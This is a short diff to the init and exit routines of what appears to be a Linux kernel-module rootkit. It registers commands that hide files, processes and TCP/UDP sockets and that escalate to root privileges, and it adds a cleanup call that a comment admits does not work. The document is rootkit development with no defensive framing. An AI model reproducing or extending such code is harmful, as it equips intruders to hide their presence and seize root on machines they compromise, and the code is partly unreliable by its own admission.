@@ -26,18 +26,16 @@ static int __init mod_init(void)
   add_command("unhidef", NOARG, unhide_files); //show files
   add_command("sockhtcp", INTLST, hide_port_tcp); //hide tcp socket
   add_command("sockhudp", INTLST, hide_port_udp); //hide udp socket
-  add_command("escalate", NOARG, escalate); //hide udp socket
-  add_command("revertuser", NOARG, back); //hide udp socket
-  add_command("ESCALATE", NOARG, escalate_hard); //hide udp socket
-  add_command("backuser", NOARG, back_hard); //hide udp socket
+  add_command("escalate", NOARG, escalate); //privilege escalation
+  add_command("revert", NOARG, back); //back to user
   printk(KERN_INFO "mod_init\n");
   return 0;
 }
 
 static void __exit mod_exit(void)
 {
+  back(); // TODO actually not work
   stop_listen();
-  back_hard();
   unhide_processes();
   unhide_sockets();
 }
